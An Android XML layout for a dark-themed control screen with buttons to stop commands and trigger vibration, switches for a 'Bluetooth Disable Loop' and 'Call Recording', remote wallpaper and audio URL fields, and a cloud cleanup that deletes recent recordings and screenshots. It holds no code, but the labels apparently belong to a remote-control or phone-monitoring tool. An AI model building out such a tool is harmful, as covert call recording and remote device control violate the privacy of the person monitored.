<?xml version="1.0" encoding="utf-8"?>
  <ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
      xmlns:app="http://schemas.android.com/apk/res-auto"
      android:layout_width="match_parent"
      android:layout_height="match_parent"
      android:background="#0D1117">

      <LinearLayout
          android:layout_width="match_parent"
          android:layout_height="wrap_content"
          android:orientation="vertical"
          android:padding="12dp">

          <!-- Quick Actions -->
          <androidx.cardview.widget.CardView
              android:layout_width="match_parent" android:layout_height="wrap_content"
              android:layout_marginBottom="10dp"
              app:cardBackgroundColor="#161B22" app:cardCornerRadius="12dp">
              <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content"
                  android:orientation="vertical" android:padding="14dp">
                  <TextView android:layout_width="match_parent" android:layout_height="wrap_content"
                      android:text="⚡ Quick Actions" android:textSize="14sp"
                      android:textStyle="bold" android:textColor="#FFFFFF" android:layout_marginBottom="10dp" />
                  <Button android:id="@+id/btnStopAll"
                      android:layout_width="match_parent" android:layout_height="44dp"
                      android:text="⛔ STOP ALL COMMANDS"
                      android:textColor="#FFFFFF" android:backgroundTint="#DA3633"
                      android:layout_marginBottom="8dp" />
                  <Button android:id="@+id/btnTriggerVibration"
                      android:layout_width="match_parent" android:layout_height="44dp"
                      android:text="📳 TRIGGER VIBRATION"
                      android:textColor="#FFFFFF" android:backgroundTint="#6E40C9" />
              </LinearLayout>
          </androidx.cardview.widget.CardView>

          <!-- Toggles -->
          <androidx.cardview.widget.CardView
              android:layout_width="match_parent" android:layout_height="wrap_content"
              android:layout_marginBottom="10dp"
              app:cardBackgroundColor="#161B22" app:cardCornerRadius="12dp">
              <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content"
                  android:orientation="vertical" android:padding="14dp">
                  <LinearLayout android:layout_width="match_parent" android:layout_height="40dp"
                      android:orientation="horizontal" android:gravity="center_vertical"
                      android:layout_marginBottom="8dp">
                      <TextView android:layout_width="0dp" android:layout_height="wrap_content"
                          android:layout_weight="1" android:text="🔵 Bluetooth Disable Loop"
                          android:textSize="13sp" android:textColor="#FFFFFF" />
                      <Switch android:id="@+id/switchBluetooth"
                          android:layout_width="wrap_content" android:layout_height="wrap_content"
                          android:thumbTint="#58A6FF" android:trackTint="#1A2A4A" />
                  </LinearLayout>
                  <LinearLayout android:layout_width="match_parent" android:layout_height="40dp"
                      android:orientation="horizontal" android:gravity="center_vertical">
                      <TextView android:layout_width="0dp" android:layout_height="wrap_content"
                          android:layout_weight="1" android:text="📞 Call Recording"
                          android:textSize="13sp" android:textColor="#FFFFFF" />
                      <Switch android:id="@+id/switchCallRecording"
                          android:layout_width="wrap_content" android:layout_height="wrap_content"
                          android:thumbTint="#00FF88" android:trackTint="#1A4A2A" />
                  </LinearLayout>
              </LinearLayout>
          </androidx.cardview.widget.CardView>

          <!-- Saved Wallpapers -->
          <androidx.cardview.widget.CardView
              android:layout_width="match_parent" android:layout_height="wrap_content"
              android:layout_marginBottom="10dp"
              app:cardBackgroundColor="#161B22" app:cardCornerRadius="12dp">
              <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content"
                  android:orientation="vertical" android:padding="14dp">
                  <TextView android:layout_width="match_parent" android:layout_height="wrap_content"
                      android:text="🖼 Wallpapers" android:textSize="14sp" android:textStyle="bold"
                      android:textColor="#FFFFFF" android:layout_marginBottom="8dp" />
                  <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content"
                      android:orientation="horizontal">
                      <EditText android:id="@+id/etWallpaperUrl"
                          android:layout_width="0dp" android:layout_height="40dp" android:layout_weight="1"
                          android:hint="Paste image / Drive URL"
                          android:textColor="#FFFFFF" android:textColorHint="#8B949E"
                          android:background="#21262D" android:paddingHorizontal="10dp"
                          android:textSize="12sp" android:layout_marginEnd="8dp" />
                      <Button android:id="@+id/btnSaveWallpaper"
                          android:layout_width="wrap_content" android:layout_height="40dp"
                          android:text="💾 Save" android:textSize="11sp"
                          android:textColor="#FFFFFF" android:backgroundTint="#1F6FEB" />
                  </LinearLayout>
                  <androidx.recyclerview.widget.RecyclerView
                      android:id="@+id/rvWallpapers"
                      android:layout_width="match_parent" android:layout_height="wrap_content"
                      android:layout_marginTop="8dp" android:nestedScrollingEnabled="false" />
              </LinearLayout>
          </androidx.cardview.widget.CardView>

          <!-- Saved Songs -->
          <androidx.cardview.widget.CardView
              android:layout_width="match_parent" android:layout_height="wrap_content"
              android:layout_marginBottom="10dp"
              app:cardBackgroundColor="#161B22" app:cardCornerRadius="12dp">
              <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content"
                  android:orientation="vertical" android:padding="14dp">
                  <TextView android:layout_width="match_parent" android:layout_height="wrap_content"
                      android:text="🔊 Remote Audio" android:textSize="14sp" android:textStyle="bold"
                      android:textColor="#FFFFFF" android:layout_marginBottom="8dp" />
                  <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content"
                      android:orientation="horizontal">
                      <EditText android:id="@+id/etSongUrl"
                          android:layout_width="0dp" android:layout_height="40dp" android:layout_weight="1"
                          android:hint="Paste audio URL"
                          android:textColor="#FFFFFF" android:textColorHint="#8B949E"
                          android:background="#21262D" android:paddingHorizontal="10dp"
                          android:textSize="12sp" android:layout_marginEnd="8dp" />
                      <Button android:id="@+id/btnSaveSong"
                          android:layout_width="wrap_content" android:layout_height="40dp"
                          android:text="💾 Save" android:textSize="11sp"
                          android:textColor="#FFFFFF" android:backgroundTint="#2DA44E" />
                  </LinearLayout>
                  <androidx.recyclerview.widget.RecyclerView
                      android:id="@+id/rvSongs"
                      android:layout_width="match_parent" android:layout_height="wrap_content"
                      android:layout_marginTop="8dp" android:nestedScrollingEnabled="false" />
              </LinearLayout>
          </androidx.cardview.widget.CardView>

          <!-- Auto Cleanup -->
          <androidx.cardview.widget.CardView
              android:layout_width="match_parent" android:layout_height="wrap_content"
              android:layout_marginBottom="10dp"
              app:cardBackgroundColor="#161B22" app:cardCornerRadius="12dp">
              <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content"
                  android:orientation="vertical" android:padding="14dp">
                  <TextView android:layout_width="match_parent" android:layout_height="wrap_content"
                      android:text="🗑 Auto Cleanup" android:textSize="14sp" android:textStyle="bold"
                      android:textColor="#FFFFFF" android:layout_marginBottom="4dp" />
                  <TextView android:id="@+id/tvCleanupInfo"
                      android:layout_width="match_parent" android:layout_height="wrap_content"
                      android:text="Delete screenshots, recordings, photos and videos older than 2 days from cloud storage."
                      android:textSize="11sp" android:textColor="#8B949E"
                      android:layout_marginBottom="10dp" />
                  <Button android:id="@+id/btnCleanup"
                      android:layout_width="match_parent" android:layout_height="44dp"
                      android:text="🗑 DELETE FILES OLDER THAN 2 DAYS"
                      android:textColor="#FFFFFF" android:backgroundTint="#DA3633" />
                  <TextView android:id="@+id/tvCleanupResult"
                      android:layout_width="match_parent" android:layout_height="wrap_content"
                      android:text=""
                      android:textSize="11sp" android:textColor="#00FF88"
                      android:gravity="center" android:layout_marginTop="6dp"
                      android:visibility="gone" />
              </LinearLayout>
          </androidx.cardview.widget.CardView>

      </LinearLayout>
  </ScrollView>